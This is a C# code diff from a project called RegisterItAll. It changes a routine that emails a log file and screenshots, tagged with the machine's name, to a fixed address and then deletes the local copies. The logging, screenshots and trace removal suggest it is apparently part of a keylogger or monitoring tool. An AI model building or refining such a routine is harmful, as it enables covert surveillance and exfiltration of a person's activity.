@@ -37,24 +37,22 @@ namespace RegisterItAll.Services
             MailMessage message = new MailMessage()
             {
                 From = new MailAddress(emailAddress, displayName: null, Encoding.UTF8),
-                Subject = "RegisterItAll",
+                Subject = $"RegisterItAll{Environment.MachineName}",
                 SubjectEncoding = Encoding.UTF8,
             };
 
             message.To.Add(emailAddress);
 
             string logs = FilesManager.GetLogsFile();
+            message.Attachments.Add(new Attachment(logs));
             FilesManager.RemoveLogsFile();
 
-            message.Attachments.Add(new Attachment(logs));
-
             IEnumerable<string> screenshots = FilesManager.GetScreenshots();
-            FilesManager.RemoveScreenshots(screenshots);
-
             foreach (string screenshot in screenshots)
             {
                 message.Attachments.Add(new Attachment(screenshot));
             }
+            FilesManager.RemoveScreenshots(screenshots);
 
             SmtpClient client = new SmtpClient()
             {
